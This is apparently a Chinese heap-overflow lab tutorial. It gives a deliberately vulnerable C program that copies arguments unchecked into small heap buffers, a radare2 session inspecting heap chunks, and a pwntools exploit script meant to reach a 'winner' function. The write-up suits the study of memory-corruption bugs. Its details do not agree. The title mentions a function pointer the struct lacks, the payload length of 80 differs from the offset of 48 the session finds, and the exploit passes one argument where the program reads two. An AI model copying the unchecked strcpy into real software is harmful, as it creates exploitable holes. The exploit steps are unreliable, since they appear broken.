覆盖相邻内存函数指针
========================================

示例代码
----------------------------------------
::

	#include <stdio.h>
	#include <stdlib.h>
	#include <string.h>
	#include <time.h>
	#include <unistd.h>

	struct heapStructure {
	  int priority;
	  char *name;
	};

	int main(int argc, char **argv) {
	  struct heapStructure *i1, *i2;

	  i1 = malloc(sizeof(struct heapStructure));
	  i1->priority = 1;
	  i1->name = malloc(8);

	  i2 = malloc(sizeof(struct heapStructure));
	  i2->priority = 2;
	  i2->name = malloc(8);

	  strcpy(i1->name, argv[1]);
	  strcpy(i2->name, argv[2]);

	  printf("and that's a wrap folks!\n");
	}

	void winner() {
	  printf(
		  "Congratulations, you've completed this level @ %ld seconds past the "
		  "Epoch\n",
		  time(NULL));
	}
		
编译环境：
	+ 系统：Linux kali 5.10.0-kali9-amd64 #1 SMP Debian 5.10.46-4kali1 (2021-08-09) x86_64 GNU/Linux
	+ 编译：gcc heap.c -o heap
	+ 附件：`heap.c <..//_static//heap.c>`_
	
调试过程
----------------------------------------
::

	r2 -d -A heap AAAA BBBB
	
	[0x564dbc559228]> pd 50 @ main
            ; DATA XREF from entry0 @ 0x564dbc5590ad
	┌ 187: int main (int argc, char **argv, char **envp);
	│           ; var int64_t var_20h @ rbp-0x20
	│           ; var int64_t var_14h @ rbp-0x14
	│           ; var int64_t var_10h @ rbp-0x10
	│           ; var int64_t var_8h @ rbp-0x8
	│           ; arg int argc @ rdi
	│           ; arg char **argv @ rsi
	│           0x564dbc559179      55             push rbp
	│           0x564dbc55917a      4889e5         mov rbp, rsp
	│           0x564dbc55917d      4883ec20       sub rsp, 0x20
	│           0x564dbc559181      897dec         mov dword [var_14h], edi ; argc
	│           0x564dbc559184      488975e0       mov qword [var_20h], rsi ; argv
	│           0x564dbc559188      bf10000000     mov edi, 0x10           ; 16
	│           0x564dbc55918d      e8defeffff     call sym.imp.malloc     ;  void *malloc(size_t size)
	│           0x564dbc559192      488945f8       mov qword [var_8h], rax
	│           0x564dbc559196      488b45f8       mov rax, qword [var_8h]
	│           0x564dbc55919a      c70001000000   mov dword [rax], 1
	│           0x564dbc5591a0      bf08000000     mov edi, 8
	│           0x564dbc5591a5      e8c6feffff     call sym.imp.malloc     ;  void *malloc(size_t size)
	│           0x564dbc5591aa      4889c2         mov rdx, rax
	│           0x564dbc5591ad      488b45f8       mov rax, qword [var_8h]
	│           0x564dbc5591b1      48895008       mov qword [rax + 8], rdx
	│           0x564dbc5591b5      bf10000000     mov edi, 0x10           ; 16
	│           0x564dbc5591ba      e8b1feffff     call sym.imp.malloc     ;  void *malloc(size_t size)
	│           0x564dbc5591bf      488945f0       mov qword [var_10h], rax
	│           0x564dbc5591c3      488b45f0       mov rax, qword [var_10h]
	│           0x564dbc5591c7      c70002000000   mov dword [rax], 2
	│           0x564dbc5591cd      bf08000000     mov edi, 8
	│           0x564dbc5591d2      e899feffff     call sym.imp.malloc     ;  void *malloc(size_t size)
	│           0x564dbc5591d7      4889c2         mov rdx, rax
	│           0x564dbc5591da      488b45f0       mov rax, qword [var_10h]
	│           0x564dbc5591de      48895008       mov qword [rax + 8], rdx
	│           0x564dbc5591e2      488b45e0       mov rax, qword [var_20h]
	│           0x564dbc5591e6      4883c008       add rax, 8
	│           0x564dbc5591ea      488b10         mov rdx, qword [rax]
	│           0x564dbc5591ed      488b45f8       mov rax, qword [var_8h]
	│           0x564dbc5591f1      488b4008       mov rax, qword [rax + 8]
	│           0x564dbc5591f5      4889d6         mov rsi, rdx
	│           0x564dbc5591f8      4889c7         mov rdi, rax
	│           0x564dbc5591fb      e830feffff     call sym.imp.strcpy     ; char *strcpy(char *dest, const char *src)
	│           0x564dbc559200      488b45e0       mov rax, qword [var_20h]
	│           0x564dbc559204      4883c010       add rax, 0x10           ; 16
	│           0x564dbc559208      488b10         mov rdx, qword [rax]
	│           0x564dbc55920b      488b45f0       mov rax, qword [var_10h]
	│           0x564dbc55920f      488b4008       mov rax, qword [rax + 8]
	│           0x564dbc559213      4889d6         mov rsi, rdx
	│           0x564dbc559216      4889c7         mov rdi, rax
	│           0x564dbc559219      e812feffff     call sym.imp.strcpy     ; char *strcpy(char *dest, const char *src)
	│           0x564dbc55921e      488d05e30d00.  lea rax, str.and_thats_a_wrap_folks_ ; rdi
	│                                                                      ; 0x564dbc55a008 ; "and that's a wrap folks!"
	│           0x564dbc559225      4889c7         mov rdi, rax
	│           ;-- rip:
	│           0x564dbc559228 b    e813feffff     call sym.imp.puts       ; int puts(const char *s)
	│           0x564dbc55922d      b800000000     mov eax, 0
	│           0x564dbc559232      c9             leave
	└           0x564dbc559233      c3             ret
	┌ 40: sym.winner ();
	│           0x564dbc559234      55             push rbp
	│           0x564dbc559235      4889e5         mov rbp, rsp
	│           0x564dbc559238      bf00000000     mov edi, 0
	
	[0x564dbc559179]> db 0x564dbc559228
	[0x564dbc559179]> dc
	hit breakpoint at: 0x564dbc559228
	[0x564dbc559228]> dmh

	  Malloc chunk @ 0x564dbd7a1290 [size: 0x20][allocated]
	  Malloc chunk @ 0x564dbd7a12b0 [size: 0x20][allocated]
	  Malloc chunk @ 0x564dbd7a12d0 [size: 0x20][allocated]
	  Malloc chunk @ 0x564dbd7a12f0 [size: 0x20][allocated]
	  Top chunk @ 0x564dbd7a1310 - [brk_start: 0x564dbd7a1000, brk_end: 0x564dbd7c2000]
	
	[0x564dbc559228]> dmhg
	Heap Layout
	┌────────────────────────────────────┐
	│    Malloc chunk @ 0x564dbd7a1290   │
	│ size: 0x20 status: allocated       │
	└────────────────────────────────────┘
		v
		│
		│
	┌────────────────────────────────────┐
	│    Malloc chunk @ 0x564dbd7a12b0   │
	│ size: 0x20 status: allocated       │
	└────────────────────────────────────┘
		v
		│
		│
	┌────────────────────────────────────┐
	│    Malloc chunk @ 0x564dbd7a12d0   │
	│ size: 0x20 status: allocated       │
	└────────────────────────────────────┘
		v
		│
		│
	┌────────────────────────────────────┐
	│    Malloc chunk @ 0x564dbd7a12f0   │
	│ size: 0x20 status: allocated       │
	└────────────────────────────────────┘
		v
		│
		└──┐
		   │
	   ┌───────────────────────────────┐
	   │  Top chunk @ 0x564dbd7a1310   │
	   └───────────────────────────────┘

	[0x564dbc559228]> pxw 0xA0 @ 0x564dbd7a1290
	0x564dbd7a1290  0x00000000 0x00000000 0x00000021 0x00000000  ........!.......
	0x564dbd7a12a0  0x00000001 0x00000000 0xbd7a12c0 0x0000564d  ..........z.MV..
	0x564dbd7a12b0  0x00000000 0x00000000 0x00000021 0x00000000  ........!.......
	0x564dbd7a12c0  0x41414141 0x00000000 0x00000000 0x00000000  AAAA............
	0x564dbd7a12d0  0x00000000 0x00000000 0x00000021 0x00000000  ........!.......
	0x564dbd7a12e0  0x00000002 0x00000000 0xbd7a1300 0x0000564d  ..........z.MV..
	0x564dbd7a12f0  0x00000000 0x00000000 0x00000021 0x00000000  ........!.......
	0x564dbd7a1300  0x42424242 0x00000000 0x00000000 0x00000000  BBBB............
	0x564dbd7a1310  0x00000000 0x00000000 0x00020cf1 0x00000000  ................
	0x564dbd7a1320  0x00000000 0x00000000 0x00000000 0x00000000  ................
	
	[0x564dbc559228]> dmhc @ 0x564dbd7a1290
	struct malloc_chunk @ 0x564dbd7a1290 {
	  prev_size = 0x0,
	  size = 0x20,
	  flags: |N:0 |M:0 |P:1,
	  fd = 0x1,
	  bk = 0x564dbd7a12c0,
	}
	chunk data = 
	0x564dbd7a12a0  0x0000000000000001  0x0000564dbd7a12c0   ..........z.MV..
	
	[0x564dbc559228]> dmhc @ 0x564dbd7a12b0
	struct malloc_chunk @ 0x564dbd7a12b0 {
	  prev_size = 0x0,
	  size = 0x20,
	  flags: |N:0 |M:0 |P:1,
	  fd = 0x41414141,
	  bk = 0x0,
	}
	chunk data = 
	0x564dbd7a12c0  0x0000000041414141  0x0000000000000000   AAAA............
	
	[0x564dbc559228]> dmhc @ 0x564dbd7a12d0
	struct malloc_chunk @ 0x564dbd7a12d0 {
	  prev_size = 0x0,
	  size = 0x20,
	  flags: |N:0 |M:0 |P:1,
	  fd = 0x2,
	  bk = 0x564dbd7a1300,
	}
	chunk data = 
	0x564dbd7a12e0  0x0000000000000002  0x0000564dbd7a1300   ..........z.MV..
	
	[0x564dbc559228]> dmhc @ 0x564dbd7a12f0
	struct malloc_chunk @ 0x564dbd7a12f0 {
	  prev_size = 0x0,
	  size = 0x20,
	  flags: |N:0 |M:0 |P:1,
	  fd = 0x42424242,
	  bk = 0x0,
	}
	chunk data = 
	0x564dbd7a1300  0x0000000042424242  0x0000000000000000   BBBB............
	
	分析利用
	# ragg2 -P 200 -r
	AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFA
	
	└─# r2 -d -A heap AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFA 0000
	Process with PID 48897 started...
	= attach 48897 48897
	bin.baddr 0x55fc75030000
	Using 0x55fc75030000
	asm.bits 64
	[x] Analyze all flags starting with sym. and entry0 (aa)
	[x] Analyze function calls (aac)
	[x] Analyze len bytes of instructions for references (aar)
	[x] Check for vtables
	[TOFIX: aaft can't run in debugger mode.ions (aaft)
	[x] Type matching analysis for all functions (aaft)
	[x] Propagate noreturn information
	[x] Use -AA or aaaa to perform additional experimental analysis.
	[0x7f276eebd050]> 
	
	[0x55fc75031179]> db 0x55fc75031200		;第一个strcpy运行后
	[0x55fc75031179]> dc
	hit breakpoint at: 0x55fc75031200
	[0x55fc75031200]> dmh

	  Malloc chunk @ 0x55fc761c0290 [size: 0x20][allocated]
	  Malloc chunk @ 0x55fc761c02b0 [size: 0x20][allocated]
	  Malloc chunk @ 0x55fc761c02d0 [corrupted]
	   size: 0x414b41414a414149
	   fd: 0x4e41414d41414c41, bk: 0x41415041414f4141

	  Top chunk @ 0x55fc761c0310 - [brk_start: 0x55fc761c0000, brk_end: 0x55fc761e1000]

	[0x55fc75031200]> 
	
	[0x55fc75031200]> dmhc @ 0x55fc761c02d0
	struct malloc_chunk @ 0x55fc761c02d0 {
	  prev_size = 0x4141484141474141,
	  size = 0x414b41414a414148,
	  flags: |N:0 |M:0 |P:1,
	  fd = 0x4e41414d41414c41,
	  bk = 0x41415041414f4141,
	  fd-nextsize = 0x4153414152414151,
	  bk-nextsize = 0x5641415541415441,
	}
	chunk too big to be displayed
	chunk data = 
	0x55fc761c02e0  0x4e41414d41414c41  0x41415041414f4141   ALAAMAANAAOAAPAA
	........
	[0x55fc75031200]> wopO 0x4153414152414151		;查找数据位置
	48
	
编写EXP
----------------------------------------
::

	from pwn import *
	elf = context.binary = ELF('./heap')
	payload = (b'A' * 80 + flat(elf.sym['winner']+0x555555554000)).replace(b'\x00', b'')
	p = elf.process(argv=[payload])
	print(p.clean().decode('latin-1'))
	
	注：0x555555554000为程序加载基址，系统关闭pie。
